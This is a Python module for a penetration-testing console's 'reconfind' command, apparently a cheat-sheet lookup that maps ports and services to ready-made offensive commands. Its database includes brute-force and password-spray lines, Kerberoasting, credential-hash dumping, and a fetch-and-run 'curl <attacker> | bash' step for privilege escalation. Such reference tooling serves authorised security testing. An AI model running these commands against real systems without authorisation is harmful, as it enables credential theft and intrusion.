from __future__ import annotations

import argparse
import sys
from pathlib import Path

from sealion import normalize, render_markdown, _paged_print

_TOOLS_DIR = Path(__file__).resolve().parent.parent / "tool"
_VULN_DIR = Path(__file__).resolve().parent.parent / "vuln"

# ---------------------------------------------------------------------------
# Knowledge base: contesti → tool consigliati con comandi pronti
# ---------------------------------------------------------------------------

RECON_DB: list[dict] = [
    # ── SMB ────────────────────────────────────────────────────────────────
    {
        "tags": ["smb", "samba", "cifs", "445", "139", "netbios", "shares",
                 "share", "rpc", "msrpc"],
        "title": "SMB / CIFS",
        "ports": "445, 139",
        "vuln": "smb",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p445 <target>",
             "note": "Enum + NSE scripts SMB"},
            {"name": "enum4linux-ng", "cmd": "enum4linux-ng -A <target>",
             "note": "Enumerazione completa (utenti, share, policy, password policy)"},
            {"name": "smbmap", "cmd": "smbmap -H <target>",
             "note": "Mappa share e permessi, download file"},
            {"name": "netexec", "cmd": "nxc smb <target> --shares",
             "note": "Share enum, brute force, spray, command exec"},
            {"name": "smbclient", "cmd": "smbclient -N -L //<target>",
             "note": "Lista share e browse anonimo"},
            {"name": "impacket", "cmd": "impacket-smbclient <target>",
             "note": "Suite completa SMB/MSRPC (psexec, secretsdump, ecc)"},
            {"name": "crackmapexec", "cmd": "crackmapexec smb <target> --shares",
             "note": "Alternativa a netexec (legacy)"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt smb://<target>",
             "note": "Brute force SMB"},
        ],
    },
    # ── SSH ────────────────────────────────────────────────────────────────
    {
        "tags": ["ssh", "openssh", "sshd", "22", "sftp"],
        "title": "SSH",
        "ports": "22",
        "vuln": "ssh",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p22 <target>",
             "note": "Banner, algoritmi, NSE scripts SSH"},
            {"name": "ssh-audit", "cmd": "ssh-audit <target>",
             "note": "Audit completo: algoritmi deboli, CVE noti"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt ssh://<target>",
             "note": "Brute force SSH"},
            {"name": "medusa", "cmd": "medusa -h <target> -U users.txt -P pass.txt -M ssh",
             "note": "Brute force parallelo SSH"},
            {"name": "ncrack", "cmd": "ncrack -p 22 -U users.txt -P pass.txt <target>",
             "note": "Brute force veloce SSH"},
            {"name": "john", "cmd": "ssh2john id_rsa > hash && john hash -w=rockyou.txt",
             "note": "Crack passphrase chiave privata SSH"},
        ],
    },
    # ── HTTP / HTTPS ──────────────────────────────────────────────────────
    {
        "tags": ["http", "https", "web", "80", "443", "8080", "8443",
                 "webapp", "website", "apache", "nginx", "iis"],
        "title": "HTTP / Web",
        "ports": "80, 443, 8080, 8443",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p80,443 <target>",
             "note": "Banner, tecnologie, NSE http scripts"},
            {"name": "wafw00f", "cmd": "wafw00f <target>",
             "note": "Rileva WAF (Web Application Firewall)"},
            {"name": "nikto", "cmd": "nikto -h http://<target>",
             "note": "Scanner web classico: misconfig, file esposti, CVE"},
            {"name": "nuclei", "cmd": "nuclei -u http://<target>",
             "note": "Scanner CVE/misconfig basato su template"},
            {"name": "gobuster", "cmd": "gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
             "note": "Directory brute force (veloce)"},
            {"name": "feroxbuster", "cmd": "feroxbuster -u http://<target>",
             "note": "Directory brute force ricorsivo (più aggressivo)"},
            {"name": "ffuf", "cmd": "ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
             "note": "Fuzzer web versatile (dir, param, vhost)"},
            {"name": "dirsearch", "cmd": "dirsearch -u http://<target>",
             "note": "Directory brute force con estensioni auto"},
            {"name": "wfuzz", "cmd": "wfuzz -w wordlist.txt http://<target>/FUZZ",
             "note": "Fuzzer generico (dir, param, header)"},
            {"name": "arjun", "cmd": "arjun -u http://<target>/page",
             "note": "Scopri parametri HTTP nascosti"},
            {"name": "httrack", "cmd": "httrack http://<target> -O ./mirror",
             "note": "Mirror completo del sito"},
        ],
    },
    # ── WordPress ─────────────────────────────────────────────────────────
    {
        "tags": ["wordpress", "wp", "wpscan", "wp-admin", "wp-login",
                 "wp-content", "xmlrpc", "cms"],
        "title": "WordPress",
        "ports": "80, 443",
        "tools": [
            {"name": "wpscan", "cmd": "wpscan --url http://<target> -e ap,at,u",
             "note": "Enum plugin, temi, utenti (ALL)"},
            {"name": "wpscan", "cmd": "wpscan --url http://<target> -e vp,vt",
             "note": "Solo plugin e temi vulnerabili"},
            {"name": "wpscan", "cmd": "wpscan --url http://<target> -U admin -P rockyou.txt",
             "note": "Brute force login WordPress"},
            {"name": "nuclei", "cmd": "nuclei -u http://<target> -tags wordpress",
             "note": "CVE specifici WordPress"},
            {"name": "nmap", "cmd": "nmap -sV --script http-wordpress-enum -p80 <target>",
             "note": "NSE enum WordPress base"},
        ],
    },
    # ── DNS ────────────────────────────────────────────────────────────────
    {
        "tags": ["dns", "53", "bind", "bind9", "nameserver", "subdomain",
                 "zone transfer", "domain"],
        "title": "DNS",
        "ports": "53",
        "vuln": "dns",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p53 <target>",
             "note": "Banner DNS + NSE scripts"},
            {"name": "dnsenum", "cmd": "dnsenum <domain>",
             "note": "Enum DNS completa: zone transfer, brute sub"},
            {"name": "gobuster", "cmd": "gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
             "note": "Subdomain brute force"},
            {"name": "theHarvester", "cmd": "theHarvester -d <domain> -b all",
             "note": "Email, nomi, IP da fonti OSINT"},
            {"name": "whois", "cmd": "whois <domain>",
             "note": "Info registrazione dominio"},
            {"name": "amass", "cmd": "amass enum -d <domain>",
             "note": "Subdomain enum avanzata (passiva + attiva)"},
            {"name": "dig", "cmd": "dig axfr @<target> <domain>",
             "note": "Zone transfer manuale"},
        ],
    },
    # ── FTP ────────────────────────────────────────────────────────────────
    {
        "tags": ["ftp", "ftps", "21", "vsftpd", "proftpd"],
        "title": "FTP",
        "ports": "21",
        "vuln": "ftp",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p21 <target>",
             "note": "Banner, anonymous login, NSE FTP scripts"},
            {"name": "nmap", "cmd": "nmap --script ftp-anon -p21 <target>",
             "note": "Verifica login anonimo"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt ftp://<target>",
             "note": "Brute force FTP"},
            {"name": "ftp", "cmd": "ftp <target>",
             "note": "Client FTP (prova anonymous/anonymous)"},
        ],
    },
    # ── SMTP ───────────────────────────────────────────────────────────────
    {
        "tags": ["smtp", "25", "587", "postfix", "sendmail", "mail",
                 "email"],
        "title": "SMTP",
        "ports": "25, 587",
        "vuln": "smtp",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p25 <target>",
             "note": "Banner, VRFY, EXPN via NSE"},
            {"name": "smtp-user-enum", "cmd": "smtp-user-enum -M VRFY -U users.txt -t <target>",
             "note": "Enum utenti via VRFY/EXPN/RCPT"},
            {"name": "theHarvester", "cmd": "theHarvester -d <domain> -b all",
             "note": "Raccolta email da fonti OSINT"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt smtp://<target>",
             "note": "Brute force SMTP auth"},
        ],
    },
    # ── SNMP ───────────────────────────────────────────────────────────────
    {
        "tags": ["snmp", "161", "162", "community", "mib", "udp161"],
        "title": "SNMP",
        "ports": "161/UDP",
        "vuln": "snmp",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sU -sV -p161 <target>",
             "note": "Scan UDP + NSE SNMP"},
            {"name": "onesixtyone", "cmd": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>",
             "note": "Brute force community string"},
            {"name": "snmpwalk", "cmd": "snmpwalk -v2c -c public <target>",
             "note": "Dump completo MIB (utenti, processi, interfacce)"},
            {"name": "braa", "cmd": "braa public@<target>:.1.3.6.*",
             "note": "SNMP query veloce e massiva"},
        ],
    },
    # ── MySQL ──────────────────────────────────────────────────────────────
    {
        "tags": ["mysql", "mariadb", "3306", "mysqld"],
        "title": "MySQL / MariaDB",
        "ports": "3306",
        "vuln": "mysql",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p3306 <target>",
             "note": "Banner + NSE mysql scripts"},
            {"name": "mysql", "cmd": "mysql -h <target> -u root -p",
             "note": "Login diretto (prova root senza password)"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt mysql://<target>",
             "note": "Brute force MySQL"},
            {"name": "nmap", "cmd": "nmap --script mysql-empty-password -p3306 <target>",
             "note": "Verifica account senza password"},
        ],
    },
    # ── MSSQL ──────────────────────────────────────────────────────────────
    {
        "tags": ["mssql", "1433", "sqlserver", "mssqlserver", "tds"],
        "title": "MSSQL",
        "ports": "1433",
        "vuln": "mssql",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p1433 <target>",
             "note": "Banner + NSE ms-sql scripts"},
            {"name": "impacket", "cmd": "impacket-mssqlclient <user>:<pass>@<target>",
             "note": "Client MSSQL (xp_cmdshell, enum DB)"},
            {"name": "netexec", "cmd": "nxc mssql <target> -u sa -p '' --local-auth",
             "note": "Enum + brute force MSSQL"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt mssql://<target>",
             "note": "Brute force MSSQL"},
        ],
    },
    # ── RDP ─────────────────────────────────────────────────────────────────
    {
        "tags": ["rdp", "3389", "remote desktop", "mstsc", "rdesktop",
                 "terminal services"],
        "title": "RDP",
        "ports": "3389",
        "vuln": "rdp",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p3389 <target>",
             "note": "Banner + NSE RDP scripts (rdp-enum-encryption)"},
            {"name": "rdp-sec-check", "cmd": "rdp-sec-check <target>",
             "note": "Audit sicurezza RDP (NLA, crittografia)"},
            {"name": "netexec", "cmd": "nxc rdp <target> -u user -p pass",
             "note": "Brute force / spray RDP"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt rdp://<target>",
             "note": "Brute force RDP"},
            {"name": "xfreerdp", "cmd": "xfreerdp /v:<target> /u:user /p:pass",
             "note": "Client RDP (connessione diretta)"},
        ],
    },
    # ── WinRM ──────────────────────────────────────────────────────────────
    {
        "tags": ["winrm", "5985", "5986", "wsman", "psremoting"],
        "title": "WinRM",
        "ports": "5985, 5986",
        "vuln": "winrm",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -p5985,5986 <target>",
             "note": "Verifica WinRM aperto"},
            {"name": "evil-winrm", "cmd": "evil-winrm -i <target> -u user -p pass",
             "note": "Shell interattiva WinRM (upload, download, PS)"},
            {"name": "netexec", "cmd": "nxc winrm <target> -u user -p pass",
             "note": "Brute force / spray WinRM"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt <target> winrm",
             "note": "Brute force WinRM"},
        ],
    },
    # ── NFS ─────────────────────────────────────────────────────────────────
    {
        "tags": ["nfs", "2049", "111", "portmapper", "rpcbind", "nfsd",
                 "mount"],
        "title": "NFS",
        "ports": "2049, 111",
        "vuln": "nfs",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p111,2049 <target>",
             "note": "Enum NFS + NSE scripts"},
            {"name": "showmount", "cmd": "showmount -e <target>",
             "note": "Lista export NFS (share montabili)"},
            {"name": "mount", "cmd": "mkdir /tmp/nfs && mount -t nfs <target>:/share /tmp/nfs",
             "note": "Monta share NFS"},
            {"name": "nmap", "cmd": "nmap --script nfs-ls,nfs-showmount -p111 <target>",
             "note": "Lista file remoti via NSE"},
        ],
    },
    # ── LDAP ───────────────────────────────────────────────────────────────
    {
        "tags": ["ldap", "ldaps", "389", "636", "active directory", "ad",
                 "directory"],
        "title": "LDAP / Active Directory",
        "ports": "389, 636",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p389,636 <target>",
             "note": "Banner LDAP + NSE scripts"},
            {"name": "ldapsearch", "cmd": "ldapsearch -x -H ldap://<target> -b '' namingContexts",
             "note": "Enum base DN (anonymous bind)"},
            {"name": "ldapsearch", "cmd": "ldapsearch -x -H ldap://<target> -b 'DC=domain,DC=local' '(objectClass=user)' sAMAccountName",
             "note": "Enum utenti AD"},
            {"name": "netexec", "cmd": "nxc ldap <target> -u '' -p '' --users",
             "note": "Enum utenti LDAP via netexec"},
            {"name": "kerbrute", "cmd": "kerbrute userenum -d domain.local --dc <target> users.txt",
             "note": "Enum utenti Kerberos (no auth)"},
        ],
    },
    # ── Kerberos / AD ──────────────────────────────────────────────────────
    {
        "tags": ["kerberos", "88", "krb5", "ad", "active directory",
                 "domain controller", "dc", "asreproast", "kerberoast",
                 "bloodhound"],
        "title": "Kerberos / Active Directory",
        "ports": "88",
        "tools": [
            {"name": "kerbrute", "cmd": "kerbrute userenum -d domain.local --dc <target> users.txt",
             "note": "Enum utenti senza credenziali"},
            {"name": "impacket", "cmd": "impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <target> -no-pass",
             "note": "AS-REP Roasting (utenti senza preauth)"},
            {"name": "impacket", "cmd": "impacket-GetUserSPNs domain.local/user:pass -dc-ip <target> -request",
             "note": "Kerberoasting (SPN → hash TGS)"},
            {"name": "netexec", "cmd": "nxc smb <target> -u user -p pass --users",
             "note": "Enum utenti dominio via SMB"},
            {"name": "impacket", "cmd": "impacket-secretsdump domain.local/admin:pass@<target>",
             "note": "Dump hash SAM/NTDS (post-exploitation)"},
            {"name": "bloodhound", "cmd": "bloodhound-python -u user -p pass -d domain.local -ns <target> -c all",
             "note": "Raccolta dati per BloodHound (attack path)"},
        ],
    },
    # ── IPMI ───────────────────────────────────────────────────────────────
    {
        "tags": ["ipmi", "623", "bmc", "idrac", "ilo", "supermicro"],
        "title": "IPMI / BMC",
        "ports": "623/UDP",
        "vuln": "ipmi",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sU -sV -p623 <target>",
             "note": "Rileva IPMI via UDP"},
            {"name": "msfconsole", "cmd": "use auxiliary/scanner/ipmi/ipmi_dumphashes",
             "note": "Dump hash IPMI (cipher zero vuln)"},
            {"name": "hashcat", "cmd": "hashcat -m 7300 ipmi_hash.txt rockyou.txt",
             "note": "Crack hash IPMI"},
        ],
    },
    # ── Oracle TNS ─────────────────────────────────────────────────────────
    {
        "tags": ["oracle", "tns", "1521", "oracletns", "oracle-tns",
                 "oradb"],
        "title": "Oracle TNS",
        "ports": "1521",
        "vuln": "oracle-tns",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p1521 <target>",
             "note": "Banner + NSE oracle scripts"},
            {"name": "odat", "cmd": "odat all -s <target>",
             "note": "Enum completa Oracle (SID, cred, file, cmd)"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt oracle://<target>",
             "note": "Brute force Oracle"},
        ],
    },
    # ── IMAP / POP3 ───────────────────────────────────────────────────────
    {
        "tags": ["imap", "pop3", "143", "110", "993", "995", "dovecot",
                 "mail"],
        "title": "IMAP / POP3",
        "ports": "143, 110, 993, 995",
        "vuln": "imap-pop3",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sV -sC -p110,143,993,995 <target>",
             "note": "Banner + NSE mail scripts"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt imap://<target>",
             "note": "Brute force IMAP"},
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt pop3://<target>",
             "note": "Brute force POP3"},
        ],
    },
    # ── WMI ────────────────────────────────────────────────────────────────
    {
        "tags": ["wmi", "135", "wmic", "dcom"],
        "title": "WMI / DCOM",
        "ports": "135",
        "vuln": "wmi",
        "tools": [
            {"name": "impacket", "cmd": "impacket-wmiexec domain/user:pass@<target>",
             "note": "Exec comandi via WMI (semi-interactive)"},
            {"name": "netexec", "cmd": "nxc wmi <target> -u user -p pass",
             "note": "Enum e exec via WMI"},
            {"name": "impacket", "cmd": "impacket-dcomexec domain/user:pass@<target>",
             "note": "Exec via DCOM (alternativa a wmiexec)"},
        ],
    },

    # ==== TASK-BASED CATEGORIES ============================================

    # ── Brute Force ────────────────────────────────────────────────────────
    {
        "tags": ["brute", "bruteforce", "brute force", "password",
                 "spray", "credential", "login", "auth"],
        "title": "Brute Force / Password Spray",
        "tools": [
            {"name": "hydra", "cmd": "hydra -L users.txt -P pass.txt <service>://<target>",
             "note": "Brute force multi-protocollo (SSH, FTP, HTTP, SMB, RDP, ...)"},
            {"name": "medusa", "cmd": "medusa -h <target> -U users.txt -P pass.txt -M <module>",
             "note": "Brute force parallelo (ssh, ftp, http, smb, ...)"},
            {"name": "ncrack", "cmd": "ncrack -U users.txt -P pass.txt <target>:<port>",
             "note": "Brute force veloce (SSH, RDP, FTP, ...)"},
            {"name": "netexec", "cmd": "nxc <proto> <target> -u users.txt -p pass.txt",
             "note": "Password spray su SMB/WinRM/RDP/LDAP/MSSQL"},
            {"name": "wpscan", "cmd": "wpscan --url http://<target> -U admin -P rockyou.txt",
             "note": "Brute force login WordPress"},
            {"name": "kerbrute", "cmd": "kerbrute bruteuser -d domain.local --dc <target> pass.txt user",
             "note": "Brute force Kerberos (no lockout)"},
        ],
    },
    # ── Password Cracking ─────────────────────────────────────────────────
    {
        "tags": ["crack", "cracking", "hash", "hashcat", "john",
                 "rainbow", "ntlm", "md5", "sha"],
        "title": "Password Cracking",
        "tools": [
            {"name": "hashid", "cmd": "hashid '<hash>'",
             "note": "Identifica tipo di hash"},
            {"name": "hashcat", "cmd": "hashcat -m <mode> hash.txt rockyou.txt",
             "note": "Crack GPU (NTLM=-m1000, MD5=-m0, SHA256=-m1400)"},
            {"name": "john", "cmd": "john hash.txt --wordlist=rockyou.txt",
             "note": "Crack CPU (autodetect format)"},
            {"name": "john", "cmd": "john --show hash.txt",
             "note": "Mostra password crackate"},
        ],
    },
    # ── Directory / Content Discovery ─────────────────────────────────────
    {
        "tags": ["directory", "dir", "dirbust", "fuzz", "fuzzing",
                 "discovery", "path", "endpoint", "api"],
        "title": "Directory / Content Discovery",
        "tools": [
            {"name": "gobuster", "cmd": "gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
             "note": "Dir brute force (veloce, stabile)"},
            {"name": "feroxbuster", "cmd": "feroxbuster -u http://<target>",
             "note": "Dir brute force ricorsivo (aggressivo)"},
            {"name": "ffuf", "cmd": "ffuf -u http://<target>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt",
             "note": "Fuzzer web versatile e veloce"},
            {"name": "dirsearch", "cmd": "dirsearch -u http://<target>",
             "note": "Dir brute force con estensioni auto"},
            {"name": "wfuzz", "cmd": "wfuzz -w wordlist.txt --hc 404 http://<target>/FUZZ",
             "note": "Fuzzer generico (dir, param, header)"},
        ],
    },
    # ── Subdomain / VHost ─────────────────────────────────────────────────
    {
        "tags": ["subdomain", "vhost", "virtual host", "subdomains"],
        "title": "Subdomain / VHost Enumeration",
        "tools": [
            {"name": "gobuster", "cmd": "gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
             "note": "Subdomain brute force DNS"},
            {"name": "ffuf", "cmd": "ffuf -u http://<target> -H 'Host: FUZZ.<domain>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <size>",
             "note": "VHost discovery via Host header"},
            {"name": "amass", "cmd": "amass enum -d <domain>",
             "note": "Subdomain enum passiva + attiva"},
            {"name": "theHarvester", "cmd": "theHarvester -d <domain> -b all",
             "note": "Subdomain + email da OSINT"},
        ],
    },
    # ── OSINT / Reconnaissance ─────────────────────────────────────────────
    {
        "tags": ["osint", "recon", "reconnaissance", "information gathering",
                 "footprint", "passive"],
        "title": "OSINT / Reconnaissance passiva",
        "tools": [
            {"name": "theHarvester", "cmd": "theHarvester -d <domain> -b all",
             "note": "Email, nomi, IP, subdomains da OSINT"},
            {"name": "amass", "cmd": "amass enum -passive -d <domain>",
             "note": "Subdomain enum passiva"},
            {"name": "recon-ng", "cmd": "recon-ng",
             "note": "Framework OSINT modulare"},
            {"name": "shodan", "cmd": "shodan host <target>",
             "note": "Info da Shodan (porte, banner, CVE)"},
            {"name": "whois", "cmd": "whois <domain>",
             "note": "Info registrazione dominio"},
            {"name": "finalrecon", "cmd": "finalrecon --full http://<target>",
             "note": "Recon web completa (header, ssl, dns, whois)"},
        ],
    },
    # ── Privilege Escalation ───────────────────────────────────────────────
    {
        "tags": ["privesc", "privilege escalation", "escalation", "root",
                 "system", "suid", "sudo", "pe"],
        "title": "Privilege Escalation",
        "tools": [
            {"name": "linpeas", "cmd": "curl http://<attacker>/static/linpeas.sh | bash",
             "note": "LinPEAS — enum PE automatica Linux"},
            {"name": "winpeas", "cmd": "curl http://<attacker>/static/winPEASx64.exe -o wp.exe && wp.exe",
             "note": "WinPEAS — enum PE automatica Windows"},
            {"name": "linux-exploit-suggester", "cmd": "bash linux-exploit-suggester.sh",
             "note": "Suggerisce kernel exploit per la versione corrente"},
            {"name": "linenum", "cmd": "bash linenum.sh",
             "note": "LinEnum — enum Linux classica"},
            {"name": "pspy", "cmd": "./pspy64",
             "note": "Monitor processi e cron senza root"},
        ],
    },
    # ── Port Scanning ──────────────────────────────────────────────────────
    {
        "tags": ["portscan", "port scan", "scan", "scanning", "nmap",
                 "ports", "tcp", "udp", "syn"],
        "title": "Port Scanning",
        "tools": [
            {"name": "nmap", "cmd": "nmap -sC -sV <target>",
             "note": "Scan standard: top 1000 TCP + version + scripts"},
            {"name": "nmap", "cmd": "nmap -p- -T4 <target>",
             "note": "Scan tutte le porte TCP (65535)"},
            {"name": "nmap", "cmd": "nmap -sU --top-ports 50 <target>",
             "note": "Scan top 50 porte UDP"},
            {"name": "nmap", "cmd": "nmap -sS -Pn -n -T4 -p- <target>",
             "note": "Scan veloce SYN (no ping, no DNS)"},
            {"name": "nmap", "cmd": "nmap -sV -sC -p<ports> <target>",
             "note": "Deep scan su porte specifiche"},
        ],
    },
    # ── Wordlist Generation ────────────────────────────────────────────────
    {
        "tags": ["wordlist", "dictionary", "cewl", "crunch", "wordgen",
                 "password list"],
        "title": "Wordlist Generation",
        "tools": [
            {"name": "cewl", "cmd": "cewl http://<target> -d 3 -m 5 -w wordlist.txt",
             "note": "Genera wordlist dal contenuto del sito"},
            {"name": "seclists", "cmd": "ls /usr/share/seclists/",
             "note": "Collezione wordlist (rockyou, dir, dns, user, ...)"},
            {"name": "slconsole", "cmd": "wordgen",
             "note": "Wizard SeaLion per generare wordlist custom"},
            {"name": "slconsole", "cmd": "wordfind <url>",
             "note": "Wizard SeaLion per trovare wordlist adatte"},
        ],
    },
]


# ---------------------------------------------------------------------------
# Matching engine
# ---------------------------------------------------------------------------

def _score_context(ctx: dict, tokens: list[str]) -> int:
    score = 0
    tags = ctx["tags"]
    for tok in tokens:
        for tag in tags:
            if tok == tag:
                score += 10
            elif min(len(tok), len(tag)) >= 4 and (tok in tag or tag in tok):
                score += 5
    return score


def _search(query: str) -> list[dict]:
    tokens = [t.lower().strip() for t in query.replace(",", " ").split() if t.strip()]
    if not tokens:
        return []

    scored: list[tuple[int, dict]] = []
    for ctx in RECON_DB:
        s = _score_context(ctx, tokens)
        if s > 0:
            scored.append((s, ctx))

    scored.sort(key=lambda x: x[0], reverse=True)
    return [ctx for _, ctx in scored]


def _format_results(results: list[dict], query: str) -> str:
    if not results:
        return (f"\n  Nessun risultato per '{query}'.\n\n"
                f"  Prova con: porta (445), servizio (smb), task (brute force),\n"
                f"  tecnologia (wordpress), o categoria (privesc, osint).\n")

    available_tools = {d.name for d in _TOOLS_DIR.iterdir() if d.is_dir()} if _TOOLS_DIR.is_dir() else set()
    available_vulns = {f.stem for f in _VULN_DIR.iterdir() if f.suffix == ".md"} if _VULN_DIR.is_dir() else set()

    parts: list[str] = [""]
    for ctx in results:
        title = ctx["title"]
        ports = ctx.get("ports", "")
        header = f"  \033[1;92m{title}\033[0m"
        if ports:
            header += f"  \033[90m(porta {ports})\033[0m"
        parts.append(header)
        parts.append("")

        for i, t in enumerate(ctx["tools"], 1):
            name = t["name"]
            badge = ""
            if name in available_tools:
                badge = " \033[92m●\033[0m"
            parts.append(f"    \033[1m[{i}]\033[0m {name}{badge}")
            parts.append(f"        \033[96m{t['cmd']}\033[0m")
            parts.append(f"        \033[90m{t['note']}\033[0m")
            parts.append("")

        refs: list[str] = []
        vuln_key = ctx.get("vuln")
        if vuln_key and vuln_key in available_vulns:
            refs.append(f"\033[96mvuln {vuln_key}\033[0m")
        tool_names = {t["name"] for t in ctx["tools"]}
        in_vault = sorted(tool_names & available_tools)
        if in_vault:
            refs.append(f"\033[96muse {' | use '.join(in_vault)}\033[0m")
        if refs:
            parts.append(f"    \033[90mVedi anche:\033[0m  {'  —  '.join(refs)}")
            parts.append("")

    parts.append(f"  \033[90m● = installabile via SeaLion (use <tool>)\033[0m")
    parts.append("")
    return "\n".join(parts)


def _list_categories() -> str:
    parts = ["\n  \033[1mCategorie disponibili:\033[0m\n"]

    service_cats = []
    task_cats = []
    for ctx in RECON_DB:
        entry = f"    \033[92m{ctx['title']:<32s}\033[0m"
        ports = ctx.get("ports")
        if ports:
            entry += f"  \033[90m{ports}\033[0m"
        tags_sample = ", ".join(ctx["tags"][:4])
        entry += f"  \033[90m({tags_sample})\033[0m"
        if ports:
            service_cats.append(entry)
        else:
            task_cats.append(entry)

    parts.append("  \033[1mServizi / Protocolli:\033[0m\n")
    parts.extend(service_cats)
    parts.append("")
    parts.append("  \033[1mTask / Categorie:\033[0m\n")
    parts.extend(task_cats)
    parts.append("")
    parts.append("  \033[90mUsa: reconfind <query> — porta, servizio, task, o tecnologia\033[0m")
    parts.append("")
    return "\n".join(parts)


# ---------------------------------------------------------------------------
# Help
# ---------------------------------------------------------------------------

def _reconfind_help() -> None:
    render_markdown(r"""# reconfind — Trova il tool giusto per la recon

Dato un contesto (porta, servizio, task, tecnologia), suggerisce i tool
migliori con comandi pronti da copiare.

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `reconfind <query>` | Cerca per porta, servizio, task, tecnologia |
| `reconfind` | Lista tutte le categorie disponibili |
| `reconfind help` | Mostra questo aiuto |

## Esempi

```bash
# Per porta
reconfind 445                → tool SMB
reconfind 22                 → tool SSH
reconfind 80                 → tool HTTP/Web

# Per servizio
reconfind smb                → enum4linux-ng, smbmap, netexec, ...
reconfind dns                → dnsenum, gobuster dns, dig, ...

# Per tecnologia
reconfind wordpress          → wpscan, nuclei, nmap wp scripts
reconfind active directory   → kerbrute, impacket, bloodhound

# Per task
reconfind brute force        → hydra, medusa, ncrack, netexec
reconfind privesc            → linpeas, winpeas, pspy
reconfind osint              → theHarvester, amass, shodan
reconfind directory          → gobuster, feroxbuster, ffuf

# Combinazioni
reconfind smb brute          → tool SMB + tool brute force
reconfind web wordpress      → tool HTTP + tool WordPress
```

## Legenda output

- **●** = tool installabile via SeaLion (`use <tool>`)
- **Vedi anche** = link a cheatsheet (`vuln <proto>`) e help tool (`use <tool>`)
- I comandi usano `<target>` come placeholder per l'IP/hostname
""")


# ---------------------------------------------------------------------------
# Command handler
# ---------------------------------------------------------------------------

def cmd_reconfind(args: argparse.Namespace, state=None) -> int:
    action = normalize(getattr(args, "action", None) or "")
    extra = getattr(args, "extra", []) or []

    if action in {"help", "h", "-h", "--help"}:
        _reconfind_help()
        return 0

    query_parts: list[str] = []
    if action and action not in {"help", "h", "-h", "--help"}:
        query_parts.append(action)
    query_parts.extend(extra)
    query = " ".join(query_parts).strip()

    if not query:
        print(_list_categories())
        return 0

    results = _search(query)
    print(_format_results(results, query))
    return 0
